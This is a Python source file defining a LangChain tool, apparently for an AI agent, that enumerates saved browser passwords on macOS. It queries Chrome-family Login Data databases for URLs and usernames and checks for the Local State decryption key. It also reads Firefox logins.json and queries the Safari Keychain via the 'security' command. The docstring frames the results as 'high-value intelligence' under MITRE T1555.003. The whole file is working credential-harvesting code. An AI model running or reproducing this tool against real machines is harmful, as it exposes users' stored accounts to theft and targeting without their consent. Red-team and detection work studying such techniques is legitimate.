"""Browser saved password enumeration.

All major browsers store saved passwords in SQLite databases on disk.
Chrome/Brave/Edge use an AES-256-GCM encrypted 'password_value' column
with the key stored in 'Local State', but the URL and username are plaintext.
Firefox stores passwords in logins.json, also encrypted but with the URL/username
plaintext. Just knowing which sites have stored passwords is high-value intelligence.

MITRE ATT&CK: T1555.003 (Credentials from Web Browsers)
"""

from __future__ import annotations

from langchain_core.tools import tool

from ..base import run_command


# Chrome-family browsers: (name, profile_path)
_CHROMIUM_BROWSERS = [
    ("Chrome",          "~/Library/Application Support/Google/Chrome"),
    ("Brave",           "~/Library/Application Support/BraveSoftware/Brave-Browser"),
    ("Edge",            "~/Library/Application Support/Microsoft Edge"),
    ("Chromium",        "~/Library/Application Support/Chromium"),
    ("Arc",             "~/Library/Application Support/Arc/User Data"),
    ("Vivaldi",         "~/Library/Application Support/Vivaldi"),
    ("Opera",           "~/Library/Application Support/com.operasoftware.Opera"),
]

_CHROMIUM_QUERY = (
    "SELECT origin_url, username_value, LENGTH(password_value) as pw_len, "
    "date_created, date_last_used "
    "FROM logins WHERE blacklisted_by_user = 0 "
    "ORDER BY date_last_used DESC LIMIT 50"
)


def _query_chromium_logins(name: str, base_path: str) -> str:
    """Query the Login Data SQLite file for a Chromium-based browser."""
    # Try Default profile first, then other profiles
    profiles = run_command(
        f"ls {base_path}/ 2>/dev/null | grep -E '^Default$|^Profile [0-9]'",
        timeout=5,
    )
    profile_dirs = profiles.stdout.splitlines() if profiles.stdout else ["Default"]

    all_rows: list[str] = []
    for profile in profile_dirs[:3]:  # Limit to 3 profiles
        profile = profile.strip()
        db_path = f"{base_path}/{profile}/Login Data"
        result = run_command(
            f"sqlite3 '{db_path}' \"{_CHROMIUM_QUERY}\" 2>/dev/null",
            timeout=8,
        )
        if result.stdout.strip():
            rows = result.stdout.strip().splitlines()
            all_rows.append(f"  [{profile}: {len(rows)} entries]")
            for row in rows[:20]:
                all_rows.append(f"    {row}")
            if len(rows) > 20:
                all_rows.append(f"    ... ({len(rows) - 20} more)")

    if not all_rows:
        return f"=== {name} saved passwords ===\n(none found or Login Data not accessible)"
    return f"=== {name} saved passwords ===\n" + "\n".join(all_rows)


@tool
def find_browser_saved_passwords() -> str:
    """Enumerate saved passwords in Chrome, Brave, Edge, Firefox, and Safari.

    For Chromium-based browsers (Chrome, Brave, Edge, Arc, Vivaldi, Opera):
    - Queries Login Data SQLite database directly
    - Returns origin URL, username, and encrypted password length
      (passwords are AES-256-GCM encrypted with a key in Local State, but
      on macOS that key is further protected by the user's Keychain login password —
      accessible to any process running as the user on an unlocked machine)
    - Shows count of saved passwords per browser/profile

    For Firefox:
    - Reads logins.json (encrypted) — reports which sites have stored credentials
    - Checks profiles.ini for active profiles

    For Safari:
    - Reports presence of SafariPasswords.sqlite if accessible

    Returns:
        Saved credential entries (URL + username) for each installed browser.
    """
    sections = []

    # ── Chromium-family ───────────────────────────────────────────────────────
    for name, base_path in _CHROMIUM_BROWSERS:
        # Check if the browser is installed first
        check = run_command(f"ls {base_path}/ 2>/dev/null | head -1")
        if not check.stdout.strip():
            continue
        sections.append(_query_chromium_logins(name, base_path))

        # Also check for the Local State key (indicates password decryption is possible)
        local_state = run_command(
            f"python3 -c \"import json; d=json.load(open('{base_path}/Local State')); "
            f"enc=d.get('os_crypt',{{}}).get('encrypted_key',''); print('encrypted_key present:', bool(enc))\" "
            f"2>/dev/null"
        )
        if local_state.stdout.strip():
            sections.append(
                f"  → {name} Local State: {local_state.stdout.strip()}"
            )

    # ── Firefox ───────────────────────────────────────────────────────────────
    ff_profiles_ini = run_command("cat ~/Library/Application\\ Support/Firefox/profiles.ini 2>/dev/null")
    if ff_profiles_ini.stdout.strip():
        # Extract profile paths
        profile_paths = run_command(
            "grep '^Path=' ~/Library/Application\\ Support/Firefox/profiles.ini 2>/dev/null"
        )
        ff_sections: list[str] = []
        for line in profile_paths.stdout.splitlines():
            profile_rel = line.replace("Path=", "").strip()
            profile_abs = f"~/Library/Application Support/Firefox/{profile_rel}"

            logins = run_command(
                f"cat '{profile_abs}/logins.json' 2>/dev/null | "
                f"python3 -c \"import sys,json; d=json.load(sys.stdin); "
                f"logins=d.get('logins',[]); "
                f"[print(l.get('hostname','?'),'|',l.get('encryptedUsername','?')[:20]) "
                f"for l in logins[:30]]\" 2>/dev/null",
                timeout=5,
            )
            if logins.stdout.strip():
                count_result = run_command(
                    f"cat '{profile_abs}/logins.json' 2>/dev/null | "
                    f"python3 -c \"import sys,json; d=json.load(sys.stdin); "
                    f"print(len(d.get('logins',[])))\" 2>/dev/null"
                )
                count = count_result.stdout.strip() or "?"
                ff_sections.append(
                    f"  [{profile_rel}: {count} saved passwords]\n"
                    + "\n".join(f"    {l}" for l in logins.stdout.splitlines()[:20])
                )

        sections.append(
            "=== Firefox saved passwords ===\n"
            + ("\n".join(ff_sections) if ff_sections else "(no logins.json found in profiles)")
        )

    # ── Safari ────────────────────────────────────────────────────────────────
    safari_pw = run_command("ls ~/Library/Safari/SafariPasswords.sqlite 2>/dev/null")
    safari_keychain = run_command(
        "security find-generic-password -s 'Safari' 2>/dev/null | grep 'acct\\|svce' | head -10"
    )
    safari_section = "=== Safari saved passwords ===\n"
    if safari_pw.stdout.strip():
        safari_section += f"SafariPasswords.sqlite found: {safari_pw.stdout.strip()}\n"
        safari_section += "(accessible to processes with Safari TCC grant or root)\n"
    if safari_keychain.stdout.strip():
        safari_section += safari_keychain.stdout.strip()
    if not safari_pw.stdout.strip() and not safari_keychain.stdout.strip():
        safari_section += "(not accessible without Full Disk Access)"
    sections.append(safari_section)

    # ── Summary ───────────────────────────────────────────────────────────────
    total_note = run_command(
        "for db in "
        "~/Library/Application\\ Support/Google/Chrome/Default/'Login\\ Data' "
        "~/Library/Application\\ Support/BraveSoftware/Brave-Browser/Default/'Login\\ Data' "
        "~/Library/Application\\ Support/Microsoft\\ Edge/Default/'Login\\ Data'; do "
        "  [ -f \"$db\" ] && sqlite3 \"$db\" 'SELECT count(*) FROM logins WHERE blacklisted_by_user=0' 2>/dev/null "
        "  && echo \"$db\"; "
        "done"
    )
    if total_note.stdout.strip():
        sections.append(
            "=== Saved password counts by browser ===\n"
            + total_note.stdout.strip()
        )

    return "\n\n".join(s for s in sections if s)
